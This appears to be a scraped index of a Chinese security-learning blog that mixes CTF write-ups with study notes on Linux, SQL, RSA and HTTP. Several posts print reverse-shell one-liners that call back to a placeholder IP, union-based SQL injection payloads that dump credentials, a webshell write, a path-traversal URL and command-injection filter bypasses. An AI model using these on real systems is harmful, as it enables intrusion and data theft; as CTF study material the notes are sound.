payload:http://192.168.0.106:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"}]},{"title":"20200402学习笔记","slug":"20200402学习笔记","date":"2020-04-02T04:14:20.000Z","updated":"2020-04-03T14:01:37.184Z","comments":true,"path":"2020/04/02/20200402学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/02/20200402%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"动态规划今天下午做了一个动态规划的题 还没大弄明白，捞的不谈。等我下次看到这or 学习一段时间动态规划后再去做。 buuctf今天做了一道ciscn 2019的题。很惭愧。这道题是华东北赛区分区赛的一道web题，当时我没做出来，只做到了如何破解md5前六位的一步，而且是用别人写的脚本跑的。当时没做xss的部分，首先是过滤的问题，过滤的字符太多，当时没有想到怎么绕过，就没有继续做了….我太菜了。今天在此整理一下该题的解题思路。首先写一段xss代码，提交后把链接放到问题反馈那，用脚本跑一下md5前6位。这一步完成后会有一个bot模拟管理员，管理员访问后通过xss发送管理员的身份信息到接收平台。从接收平台获取到session后，使用管理员登录。扫描后台发现admin.phpPHPSESSID修改后登录即可首先用group by 判断列数，然后找一下数据库名 -1 and 1=2 union select 1,2,database() from information_schema.schemata -&gt;数据库名 ciscn根据数据库名找表（通过limit看有多少表、多少多少字段）-1 union select 1,2,table_name from information_schema.tables where table_schema=’ciscn’ -》找到表flag 然后limit 找其他的表，这里其他的表没啥用根据表名找列-1 union select 1,2,column_name from information_schema.columns where table_name =’flag’ -》找到列 flagg根据列名查数据 -1 union select 1,2,flagg from flag 找到flag。getflag。彳亍。。就看看user表有啥把-1 union select 1,2,table_name from information_schema.tables where table_schema=’ciscn’ limit 1,1 找到users表-1 union select 1,2,column_name from information_schema.columns where table_name=’users’ 找到USER字段 limit 1,1 找到CURRENT_CONNECTIONS，username，password字段-1 union select 1,username,password from users limit 这句话应该就对应着这个查询框 select username,password from users where id=?这道题就结束了。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"20200331学习笔记","slug":"20200331学习笔记","date":"2020-03-31T14:04:55.000Z","updated":"2020-03-31T14:37:53.385Z","comments":true,"path":"2020/03/31/20200331学习笔记/","link":"","permalink":"https://polosec.github.io/2020/03/31/20200331%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"浮生日记2020.3.31 晴今天又是菜鸡的一天，刷题入门题就不会，心态崩了dp，一定拿下！ c语言相关参考链接：https://blog.csdn.net/danxibaoxxx/article/details/81236180https://blog.csdn.net/CV_Jason/article/details/85244813https://blog.csdn.net/bestkilly/article/details/80659109?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-taskhttps://blog.csdn.net/abaloon/article/details/8173552https://blog.csdn.net/ai_yue/article/details/82777806?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task ld&amp;lf这涉及到了c语言的精度问题。首先看常见数据类型的取值范围：char -128 ~ +127 (1 Byte)short -32767 ~ + 32768 (2 Bytes)unsigned short 0 ~ 65536 (2 Bytes)int -2147483648 ~ +2147483647 (4 Bytes)unsigned int 0 ~ 4294967295 (4 Bytes)long == intlong long -9223372036854775808 ~ +9223372036854775807 (8 Bytes)double 1.7 * 10^308 (8 Bytes)unsigned int 0～4294967295long long的最大值：9223372036854775807long long的最小值：-9223372036854775808unsigned long long的最大值：1844674407370955161__int64的最大值：9223372036854775807__int64的最小值：-9223372036854775808unsigned __int64的最大值：18446744073709551615结论：输入输出long long/double的时候需要用%ld/%lf 存储形式存储形式参考第三个链接，需要注意的是阶码是怎么得来的，我一开始也想错了。 补码表示范围为什么八位二进制补码的表示范围是-128 — +127？首先明确第一位是符号位。以下为原码表示：正数： +0—+12700000000—01111111负数：-0 —- -12710000000 —- 11111111 无符号数10000000代表128，在补码中本来应该是-0，由于一个数对应一个补码，所以-0的补码用来表示-128。这也解释了为什么8位二进制数可表示的范围是-128~127。","categories":[],"tags":[{"name":"c语言","slug":"c语言","permalink":"https://polosec.github.io/tags/c%E8%AF%AD%E8%A8%80/"}]},{"title":"linux&shell&反弹shell&环境变量","slug":"linux-shell-反弹shell","date":"2020-03-30T02:25:51.000Z","updated":"2020-03-30T09:11:33.208Z","comments":true,"path":"2020/03/30/linux-shell-反弹shell/","link":"","permalink":"https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/","excerpt":"","text":"近期学习了许多关于Linux的基础知识，也从侧面反映出了我上课所学的基础知识没有多加练习，忘了不少。本文学习路线：首先是在CTF比赛中遇到了需要反弹shell的问题，采用常用反弹shell的方式无法反弹，于是学习了用curl反弹shell等多种反弹shell的方式；探究反弹shell的本质，学习到了&lt;与&gt;以及输入输出重定向；跑脚本的时候太麻烦，需要切换到脚本目录，于是学习了如何添加环境变量以及如何用alias。 预备知识linux shell、反弹shell、重定向、环境变量 参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）https://xz.aliyun.com/t/2548https://xz.aliyun.com/t/2549http://www.linuxso.com/command/alias.htmlhttps://blog.csdn.net/revilwang/article/details/8374362https://blog.csdn.net/flw8840488/article/details/90513873https://blog.csdn.net/lw305080/article/details/52054188https://www.runoob.com/linux/linux-system-contents.html shell如何理解shell？shell是用户与Linux内核之间的一层“代理”，用户通过shell与Linux内核建立联系。shell是在内核基础上编写的应用程序。当然，shell也支持编程，这里不展开讲解。 反弹shell先说怎么反弹shell，再说反弹shell的原理。首先攻击机上执行 nc -lvp 8888 bash反弹bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 curl反弹首先在公网vps 写好反弹shell的语句 保存到ip/bashRCE: curl ip/bash |bash // |是管道符，意思是将上一个的输出作为下一个的输入 nc反弹受害机执行 nc -e /bin/sh ip port如果nc版本不对的话可以这样：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f execexec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&1;done 理解反弹shell 第一句：bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1理解：将交互式bash的输出与错误输出重定向到/dev/tcp/ip/port 文件，并且将标准输入重定向到标准输出。前面的&amp;&gt;代表将输出与错误输出都重定向到后面的文件，后面的0&amp;&gt;1代表将标准输入（文件操作符0）重定向到标准输出（文件操作符1）。注意，这里的&amp;代表了识别后面的1为文件操作符（代表标准输出），而不是“1”这个文件。Linux操作系统把所有内容都抽象为文件，包括tcp连接。示意图虚线表示了stdin 重定向到stdout，由于stdout已经重定向到了/dev/tcp/ip/port ，所以stdin也将重定向到/dev/tcp/ip/port。 第二句 RCE: curl ip/bash |bash // |是管道符，意思是将上一个的输出作为下一个的输入首先在公网vps上写一个文件，内容为bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 重命名为bash然后再受害机上执行curl ip/bash | bash 意思就是说通过curl获取bash的html内容，并且作为下一个的输入。bash是Linux中的shell，用于用户和内核交互。相当于用户输入了bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 第三句 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f相当于创建了一个管道/tmp/f ，错误输出重定向到标准输出，标准输出重定向到/tmp/f ,把cat /tmp/f的结果传给交互式shell执行，传给nc ip port。形成环路。大佬解读：mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路我的解读：其实后半段的意思就是把传进来的命令用/bash/sh 执行，然后把结果传给ip port,然后 ip port 发送的结果传给/tmp/f,然后cat tmp /f,然后shell执行….就这么套娃，交互式shell就成了。环境变量环境变量文件： /etc/profile 全局用户，应用于所有的Shell。 /$HOME/.profile 当前用户，应用于所有的Shell。 /etc/bash_bashrc 全局用户，应用于Bash Shell。 ~/.bashrc 局部当前，应用于Bash Sell。写入/etc/profile文件export $PATH:/dir/subdir环境变量解析过程系统环境变量/etc/profile: 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行,并从/etc/profile.d目录的配置文件中搜集shell的设置./etc/bashrc: 为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取.用户环境变量.bash_profile ：定义了用户的个人化路径与环境变量的文件名称。每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次。（在这个文件中有执行.bashrc的脚本）.bashrc ：该文件包含专用于你的shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取。例如你可以将用户自定义的alias或者自定义变量写到这个文件中。.bash_history ：记录命令历史用的。.bash_logout ：当退出shell时，会执行该文件。可以把一些清理的工作放到这个文件中。用户切换与环境变量大部分Linux发行版的默认账户是普通账户，而更改系统文件或者执行某些命令，需要root身份才能进行，这就需要从当前用户切换到root用户，Linux中切换用户的命令是su或su -前者只是切换root身份，但shell环境仍然是普通用户的shell；而后者连用户和shell环境一起切换成root身份了。只有切换了shell环境才不会出现PATH环境变量错误。su切换成root用户以后，pwd一下，发现工作目录仍然是普通用户的工作目录；而用su - 命令切换以后，工作目录变成root工作目录了。Linux文件目录 /bin：bin是Binary的缩写, 这个目录存放着最经常使用的命令。 /boot：这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。 /dev ：dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /etc：这个目录用来存放所有的系统管理所需要的配置文件和子目录。 /home：用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。 /lib：这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。 /lost+found：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。 /media：linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。 /mnt：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。 /opt： 这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。 /proc：这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器： /root：该目录为系统管理员，也称作超级权限者的用户主目录。 /sbin：s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。 /selinux： 这个目录是Redhat/CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。 /srv： 该目录存放一些服务启动之后需要提取的数据。 /sys： 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。 sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统。该文件系统是内核设备树的一个直观反映。 当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。 /tmp：这个目录是用来存放一些临时文件的。 /usr： 这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。 /usr/bin：系统用户使用的应用程序。 /usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。 /usr/src：内核源代码默认的放置目录。 /var：这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 /run：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://polosec.github.io/tags/linux/"}]},{"title":"RSA Encryption","slug":"RSA-AES-Encryption","date":"2020-03-27T03:18:31.000Z","updated":"2020-03-30T02:51:04.088Z","comments":true,"path":"2020/03/27/RSA-AES-Encryption/","link":"","permalink":"https://polosec.github.io/2020/03/27/RSA-AES-Encryption/","excerpt":"","text":"致敬、参考https://blog.csdn.net/dbs1215/article/details/48953589https://www.jianshu.com/p/0f9b72d691c2https://blog.csdn.net/weixin_37490221/article/details/80823129 RSARSA基本概念RSA是一种非对称加密算法。当时学计算机网络的时候对对称、非对称的概念很模糊，总是记不清。前两天SSH登录尝试了RSA免密登录，结合之前问过的老师的相关内容，对RSA的整个过程有了一个大致的了解。私钥一定只有自己知道才能保证安全！！密文=(明文E)mod N明文=(密文D)mod N符号说明：N：由两个质数pq构成。L：1&lt;L&lt;lcm(p-1,q-1) (p-1,q-1的最小公倍数)E：1&lt;E&lt;L &amp;&amp; gcd(E,L)=1D: 1&lt;D&lt;L &amp;&amp; ED mod L=1 (这也印证了对E的定义中为什么E和L要互质) 实现过程取p=17,q=19,则N=323则L=lcm(16,18)=144∵1&lt;E&lt;L &amp;&amp; gcd(E,L)=1∴ E=5由1&lt;D&lt;L &amp;&amp; ED mod L=1可得：7*D MOD 144 =1 -&gt; 5D=145n(n∈N)（这里的N*代表正整数）可得D=29则：公钥对(E,N)=(5,323)私钥对(D,N)=(29,323)设原始消息M=233，经私钥加密后的密文=明文E mod N=275解密过程中，明文=密文D mod N=233，还原成功。 RSA工作过程原始需要发送的消息为m公钥加密方法为pubencode()公钥解密方法为pubdecode()公钥加密/解密得到的内容为pub(m)私钥加密方法为priencode()私钥解密方法为pridecode()私钥加密/解密得到的内容为pri(m)Client————————–transmitting ————ServerM1-&gt;priencode()-&gt;pri(M1)-&gt; ………….. pri(M1)-&gt;pubdecode()-&gt;M1M2&lt;-pridecode()&lt;-pub(M2)&lt;- ………….. pub(M2)&lt;-pubencode()&lt;-M2 SSH免密登陆基于口令的验证 基于密钥的验证使用RSA的公钥、私钥机制可以实现ssh免密登录。工作流程：1.client生成公钥，私钥，并且把公钥存储在server的authorized_keys文件里面2.client发送连接请求，发送公钥3.server如果发现client的公钥在authorized_keys文件里面的话，会生成一段随机字符串用公钥加密发送给client4. client收到加密后的字符串后使用私钥解密，然后把解密后的字符串发给server5.server验证字符串是否和发送的相等，相等的话则建立链接。","categories":[],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://polosec.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"URL编码解码","slug":"URL编码","date":"2020-03-26T12:29:53.000Z","updated":"2020-03-29T12:46:18.208Z","comments":true,"path":"2020/03/26/URL编码/","link":"","permalink":"https://polosec.github.io/2020/03/26/URL%E7%BC%96%E7%A0%81/","excerpt":"","text":"浮生日记3.26 阴 URL编码参考：https://blog.csdn.net/ljhabc1982/article/details/7094757https://www.cnblogs.com/jerrysion/p/5522673.htmlhttps://www.cnblogs.com/mengff/p/7282488.htmlhttps://blog.csdn.net/danielzhou888/article/details/72861097URL编码概念捞的不谈。只有数字，大小写字母，特定的保留字才不会进行URL编码。 Understanding of Content-Type在HTTP请求和响应投中用Content-Type来表示具体请求中的媒体类型信息。 常见的媒体格式类型如下： text/html ： HTML格式 text/plain ：纯文本格式 text/xml ： XML格式 image/gif ：gif图片格式 image/jpeg ：jpg图片格式 image/png：png图片格式 以application开头的媒体格式类型： application/xhtml+xml ：XHTML格式 application/xml ： XML数据格式 application/atom+xml ：Atom XML聚合格式 application/json ： JSON数据格式 application/pdf ：pdf格式 application/msword ： Word文档格式 application/octet-stream ： 二进制流数据（如常见的文件下载） application/x-www-form-urlencoded ： 中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式） multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式 get/post of form如果enctype为默认的application/x-www-form-urlencoded时：form的method为get时话，则把参数按照?k1=v1&amp;k2=v2的形式拼接到URL的后面直接访问。firn的method为post的话，则把参数放以k1=v1&amp;k2=v2的形式到请求体里面。在有 input type=file 时候，要用multipart/form-data编码方式。浏览器会把表单以控件为单位分割，每个部分使用 –boundary 分割开来，最后一行使用 –boundary– 结尾，并且为每个部分加上Content-Dispositon(form-data或file)、Content-Type(默认text/plain)、name(控件name)等信息，并加上分割符(boundary)。举例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657通过form表单提交文件操作如下：&lt;form method=&quot;post&quot;action=&quot;http://w.sohu.com/t2/upload.do&quot; enctype=”multipart/form-data”&gt; &lt;inputtype=&quot;text&quot; name=&quot;desc&quot;&gt; &lt;inputtype=&quot;file&quot; name=&quot;pic&quot;&gt; &lt;/form&gt; 浏览器将会发送以下数据：POST /t2/upload.do HTTP/1.1User-Agent: SOHUWapRebotAccept-Language: zh-cn,zh;q=0.5Accept-Charset: GBK,utf-8;q=0.7,*;q=0.7Connection: keep-aliveContent-Length: 60408Content-Type:multipart/form-data; boundary=ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXCHost: w.sohu.com --ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXCContent-Disposition: form-data;name=&quot;desc&quot;Content-Type: text/plain; charset=UTF-8Content-Transfer-Encoding: 8bit [......][......][......][......]...........................--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXCContent-Disposition: form-data;name=&quot;pic&quot;; filename=&quot;photo.jpg&quot;Content-Type: application/octet-streamContent-Transfer-Encoding: binary [图片二进制数据]--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC-- 对URL编码的理解：在浏览器发送请求前，如果发现传入的参数包括了除保留字和非保留字之外的字符，则需要进行URL编码，然后进行传输。服务器接受到请求后会自动执行一次解码过程。即：客户端发送请求前确保URL符合规范；否则进行URL编码；-&gt;传送到服务端默认进行一次URL解码；然后服务器端进行一次URL编码后发送给客户端-&gt;客户端进行URL解码并显示。那么问题来了。如果我的请求参数中存在特殊符号，那么编码又是什么情况？比如param1=admin+1如果这样直接提交请求的话，浏览器检查通过，直接发送（因为+是保留字，被翻译成空格）在bing搜索123%123 其实搜出来的是123 123下图是输入编码后的数据%2b的情况：下图是直接输入+的情况 保留字符不用于URI分隔符，而是用于其它位置，比如参数的value时，要对这时用到的保留字符做URL编码。比如pa1=admin&amp;pa3 , pa2=123123如果不对value中的保留字进行编码的话，则结果是这样的：pa1=admin&amp;pa3&amp;pa2=123123可能存在安全隐患。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"mysql注入基础&Linux基础","slug":"mysql注入基础","date":"2020-03-26T12:29:53.000Z","updated":"2020-03-29T12:51:07.850Z","comments":true,"path":"2020/03/26/mysql注入基础/","link":"","permalink":"https://polosec.github.io/2020/03/26/mysql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"","text":"致敬https://www.freebuf.com/column/201364.html basic stucture of mysql databasemysql5内置系统数据库IFORMATION_SCHEMA，记录了数据库中所有的数据库名、数据库表名、数据库表字段名。其中的关键表：SCHEMATA，存储数据库名，关键字段：SCHEMA_NAME -&gt;数据库名称例句:select schema_name from INFORMATION_SCHEMA.SCHEMATA; 则查询到的是当前所有数据库的名称。tables:存储表名关键字段：TABLE_SCHEMA -&gt;表示该表名属于哪个数据库名关键字段：TABLE_NAME -&gt;存储表的表名例句 select table_name from INFORMATION_SCHEMA.tables ; //查询所有的表名select table_name from INFORMATION_SCHEMA.tables where table_schema=’dvwa’; //查询dvwa数据库的表名columns:存储列名关键字段：TABLE_SCHEMA -&gt;该字段所属数据库名 关键字段：TABLE_NAME -&gt;存储所属表的名称 关键字段：COLUMN_NAME -&gt;该字段的名称例句： select column_name from INFORMATION_SCHEMA.columns where table_name=’users’ and table_schema=’dvwa’;//查找dvwa数据库中user表中所有字段常用变量Select database() 数据库名称Select VERSION() 数据库版本信息Select @@VERSION 数据库版本信息Select @@GLOBAL.VERSION 数据库版本信user() 系统用户和登录主机名current_user() 当前登录用户和登录主机名system_user() 数据库系统用户账户名称和登录主机名session_user() 当前会话用户名和登录主机名 写一句话select ‘’intooutfile ‘/var/www/html/dvwa/1.php’; //导出一句话木马 判断列数order by n如果order by n报错并且order by n-1返回结果，则列数为n-1 linux命令find(待补充)find / -name ‘fla‘ 查找所有包含fla的文件find / -name flag 查找所有以flag命名的文件-iname选项不区分大小写 空格绕过cat flag.txtcat${IFS}flag.txtcat$IFS$9flag.txtcat&lt;flag.txtcat&lt;&gt;flag.txt lsls -l 列出文件详细信息，如权限 大小 所有者和所属组，修改时间等ls -all / ll 显示隐藏文件、列出文件详细信息，如权限 大小 所有者和所属组，修改时间等-rwxrw-r‐-1 root root 1213 Feb 2 09:39 abc第一个-代表文件，d代表目录,l代表链接。r 读 w写 x执行三段分别对应用户、组、其他的权限。 root root 分别表示用户、用户所在的组 chmodchmod u/g/o +/-/= r/w/x filenamechmod u+x 1.txt 当前user可执行1.txtchmod 755 1.txt 对应权限：rwxr-xr-x","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"wget&curl","slug":"wget-curl","date":"2020-03-23T12:54:28.000Z","updated":"2020-04-21T15:59:27.626Z","comments":true,"path":"2020/03/23/wget-curl/","link":"","permalink":"https://polosec.github.io/2020/03/23/wget-curl/","excerpt":"","text":"致敬https://www.cnblogs.com/duhuo/p/5695256.html curl基本用法下载curl www.baidu.com （默认get方式访问www.baidu.com 并且将html代码回显）curl www.baidu.com &gt;&gt; baidu.html 保存为baidu.htmlcurl -o 2.jpg www.baidu.com/1.jpg 下载1.jpg并保存为2.jpg ftp下载：curl -o -u username:password ftp://www.baidu.com ftp上传curl -T todo.jpg -u username:password ftp://www.baidu.com wgetwget命令用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。 基本用法wget -i filelist.txt 会下载filelist.txt里面所有的文件。wget -c www.baidu.com/iso.iso 支持断点续传wget -r -np www.baidu.com/pack/ np表示不遍历父目录，nd表示不在本机重新创建目录结构wget -O filename www.baidu.com/1.php 将文件命名为filename并保存","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://polosec.github.io/tags/linux/"}]},{"title":"git快速入门&&git泄露","slug":"git快速入门-git泄露","date":"2020-03-20T15:18:05.000Z","updated":"2020-03-29T12:35:49.120Z","comments":true,"path":"2020/03/20/git快速入门-git泄露/","link":"","permalink":"https://polosec.github.io/2020/03/20/git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8-git%E6%B3%84%E9%9C%B2/","excerpt":"","text":"git学习链接:https://learngitbranching.js.org/https://bingohuang.gitbooks.io/progit2/content/10-git-internals/sections/objects.htmlhttps://zhuanlan.zhihu.com/p/44741777 git泄露原理：通过.git文件夹以及子目录、文件可以还原工程源代码。过程：1.解析.git/index文件，找到工程所有：（文件名，文件sha1）2.去.git/objects/文件夹下载对应的文件3.zlib解压文件，按原始的目录结构写入源代码利用工具：GitHack 利用场景git stash 暂存当前没有完成的工作，当处理完bug后可以通过 git stash pop 将之前没做完的工作合并过来。所以可以通过 git stash pop 弹出之前尚未提交的文件git reset –hard HEAD～1 (或是版本号)意为将版本库回退1个版本，但是不仅仅是将本地版本库的头指针全部重置到指定版本，也会重置暂存区，并且会将工作区代码也回退到这个版本git diff hash 对比当前版本与hash版本提交的区别。git checkout hash 切换到hash版本的提交中。/切换分支git branch -a //show all branches 针对练习练习平台：CTFHUB https://www.ctfhub.com/#/skilltree技能树-web-信息泄露-git","categories":[{"name":"git","slug":"git","permalink":"https://polosec.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://polosec.github.io/tags/git/"}]},{"title":"堆叠注入","slug":"堆叠注入","date":"2020-03-17T06:30:29.000Z","updated":"2020-03-17T07:25:22.029Z","comments":true,"path":"2020/03/17/堆叠注入/","link":"","permalink":"https://polosec.github.io/2020/03/17/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","excerpt":"","text":"基本概念将原来的语句构造完后加上分号，代表该语句结束，后面再输入的就是新的sql语句。 使用条件堆叠注入的使用条件有限。只有当调用数据库函数支持执行多条sql语句时才能够使用，比如php中的mysqli_multi_query()函数。sql=”select * from flag where id=$_POST[‘id’]”;则可构造:1;select * from flag练习题：BUUCTF [SUCTF 2019]EasySQL","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"命令注入绕过&URL解析","slug":"命令注入绕过-URL解析","date":"2020-03-16T12:09:50.000Z","updated":"2020-03-16T14:35:05.694Z","comments":true,"path":"2020/03/16/命令注入绕过-URL解析/","link":"","permalink":"https://polosec.github.io/2020/03/16/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-URL%E8%A7%A3%E6%9E%90/","excerpt":"","text":"题目环境：ctfhub-综合命令注入致敬、参考：回车&amp;换行 题目分析123456789101112131415&lt;?php$res = FALSE;if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123; $ip = $_GET[&#x27;ip&#x27;]; $m = []; if (!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123; $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;; exec($cmd, $res); &#125; else &#123; $res = $m; &#125;&#125;?&gt; 通过阅读源码发现，过滤了| &amp; ; 空格 / cat flag ctfhub这几个关键字。不绕过的话根本日不进去。接下来考虑绕过首先先ls一下看看里面有啥。想ls，首先要把分隔符绕过了才能ls。这里采用URL编码,即%0a代表换行符。尝试：成功。接下来我们需要做的是查看flag_is_here文件夹有啥。（或许不是文件夹）这里由于过滤了flag字段和空格，所以可以采用fl\\ag这种形式绕过flag，采用${IFS}绕过空格过滤。payload:ip=127.0.0.1%0als${IFS}fl\\ag_is_here之后得到结果flag_5145112918545.php。下一步就应该康康这里面有什么了。假设当前目录为/，我们需要读取/flag_is_here/flag_5145112918545.php文件的内容。继续分析。由于过滤了路径分隔符\\，考虑采用综合命令：先cd进入flag_is_here文件夹，然后cat flag_5145112918545.php文件，当然，针对cat的绕过有很多方法 比如ca\\t 或者直接sort flag_5145112918545.phppayload:ip=127.0.0.1%0acd${IFS}fl\\ag_is_here%0aca\\t${IFS}fl\\ag_5145112918545.php或者把ca\\t换成sort。一样 注意内容：这里换行符需要注意。换行符的URL编码为%0a,采用GET方式。所以需要你直接使用GET方式提交数据，而不能在输入框输入数据。因为在输入框输入数据后，浏览器会自动进行一次urlencode()的过程，会把%0a再次url编码成别的。这就不是我们想要的了。所以可以用hackbar或者burp直接用get方式提交。常见命令注入绕过姿势先看致敬、参考链接中的回车&amp;换行。command1 &amp;&amp; command2 cmd1成功执行后执行cmd2command1 | command2 只执行command2cmd1 || cmd2 cmd1不成功执行则执行cmd2command1 &amp; command2 先执行command2后执行command1空格绕过（以、为分界）：&lt;、&lt;&gt;、${IFS}、$IFS$9$IFS 代表分隔符，$9代表当前系统shell进程中的第九个参数持有者，始终为空字符串。比如：cat ${IFS}filename ===cat $IFS$9filename ===cat filenmae;绕过：首先要知道;代表连续指令，简单地说就是用;可以把多条指令写一行然后分别执行。绕过方法：使用%0a编码绕过。原理：假设原命令为cmd1;cmd2;cmd3\\n使用%0a绕过后：cmd1%0acmd2%0acmd3%0a ==&gt;cmd1\\ncmd2\\ncmd3\\n 注意理解换行符的概念。就知道为什么这样可以绕过了。（粗暴的理解:一个\\n就代表\\n前面的命令执行一次）黑名单字符绕过：a=fl;b=ag;$a$b -&gt;flagcat ca\\t -&gt;cat或者用别的方法。比如可以用sort/head/tail/strings 替换cat#URL解析全过程什么是URL区分URL\\URIURL统一资源定位符，用于互联网上不同的资源的标识，就像不同的人有不同的身份证一样。URL包括协议、域名、路径、参数、查询等。比如：http://polosec.github.io/index.html URL编码规则Url编码通常也被称为百分号编码，编码方式非常简单，使用%百分号加上两位的字符——0123456789ABCDEF——代表一个字节的十六进制形式。Url编码默认使用的字符集是US-ASCII。例如a在US-ASCII码中对应的字节是0x61，那么Url编码之后得到的就是%61，我们在地址栏上输入 http://g.cn/search?q=%61%62%63 ，实际上就等同于在google上搜索abc了。又如@符号在ASCII字符集中对应的字节为0x40，经过Url编码之后得到的是%40。对于非ASCII字符，需要使用ASCII字符集的超集进行编码得到相应的字节，然后对每个字节执行百分号编码。对于Unicode字符，RFC文档建议使用utf-8对其进行编码得到相应的字节，然后对每个字节执行百分号编码。如”中文”使用UTF-8字符集得到的字节为0xE4 0xB8 0xAD 0xE6 0x96 0x87，经过Url编码之后得到”%E4%B8%AD%E6%96%87”。 URL编码/解码时间节点发送请求的时候客户端会自动编码，服务器端接受到请求后会自动解码；然后编码发送给客户端；客户端再解码。关于二次编码/二次解码的问题：二次编码&amp;二次解码用来解决中文编码后乱码的问题 域名解析输入URL按回车后，首先进行的是域名解析操作。首先查看缓存：依次查找浏览器内部缓存、本机hosts文件、本地路由器缓存、然后是ISP提供商的缓存。如果缓存都没有的话，则本地DNS服务器向根域名服务器进行迭代查询，查询到结果后返回给主机。递归查询、迭代查询 进行TCP连接(三次握手)获取到服务器IP地址后，浏览器会以一个随机端口向服务器的80(默认)端口发起TCP连接请求。 客户端发送HTTP请求建立连接后，浏览器发送一个HTTP请求。请求包含请求头和请求正文。请求头一般包括请求方法，资源路径，HTTP协议版本、cookie、host、accept等字段。请求正文则是客户端发送的信息。 